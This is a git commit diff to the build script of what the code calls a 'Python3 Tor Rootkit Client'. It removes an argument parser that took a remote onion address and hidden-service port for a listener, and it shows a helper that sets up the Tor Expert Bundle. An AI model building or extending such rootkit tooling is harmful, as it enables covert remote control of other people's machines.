a22b49aefce22c1b873ffde4a4f94a5b138a7f55
emcruise <76820025+emcruise@users.noreply.github.com>
2021-10-15 14:33:19 +0200

    Update build.py

--- client/build.py
+++ client/build.py
@@ -12,7 +12,6 @@ from string import (
 )
 
 
-
 def get_tor_expert_bundle():
     # create directory for the tor expert bundle
     os.mkdir('torbundle')
@@ -39,14 +38,6 @@ def get_tor_expert_bundle():
 
     # change directory back to \client
     os.chdir('..')
-
-
-def parse_args():
-    parser = ArgumentParser(description='Python3 Tor Rootkit Client')
-    parser.add_argument('onion', type=str, help='The remote onion address of the listener.')
-    parser.add_argument('port', type=int, help='The remote hidden service port of the listener.')
-    args = parser.parse_args()
-    return args.onion, args.port
 
 
 if __name__ == '__main__':
